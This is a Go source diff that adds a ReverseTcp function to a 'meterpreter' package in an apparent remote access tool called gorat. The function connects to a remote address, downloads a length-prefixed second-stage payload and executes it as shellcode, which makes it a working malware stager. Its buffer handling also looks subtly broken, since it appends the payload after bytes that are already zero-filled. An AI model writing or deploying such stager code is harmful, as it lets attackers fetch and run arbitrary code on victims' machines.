@@ -1,9 +1,13 @@
 package meterpreter
 
 import (
+	"encoding/binary"
 	"math/rand"
+	"net"
 	"runtime"
 	"time"
+
+	"github.com/krishpranav/gorat/shell"
 )
 
 func Meterpreter(connType, address string) (bool, error) {
@@ -59,4 +63,41 @@ func GenerateURIChecksum(length int) string {
 			return uriString
 		}
 	}
+}
+
+func ReverseTcp(address string) (bool, error) {
+	var (
+		stage2LengthBuf []byte = make([]byte, 4)
+		tmpBuf          []byte = make([]byte, 2048)
+		read            int    = 0
+		totalRead       int    = 0
+		stage2LengthInt uint32 = 0
+		conn            net.Conn
+		err             error
+	)
+
+	if conn, err = net.Dial("tcp", address); err != nil {
+		return false, err
+	}
+
+	defer conn.Close()
+
+	if _, err = conn.Read(stage2LengthBuf); err != nil {
+		return false, err
+	}
+
+	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
+	stage2Buf := make([]byte, stage2LengthInt)
+
+	for totalRead < (int)(stage2LengthInt) {
+		if read, err = conn.Read(tmpBuf); err != nil {
+			return false, err
+		}
+		totalRead += read
+		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
+	}
+
+	shell.ExecShellcode(stage2Buf)
+
+	return true, nil
 }
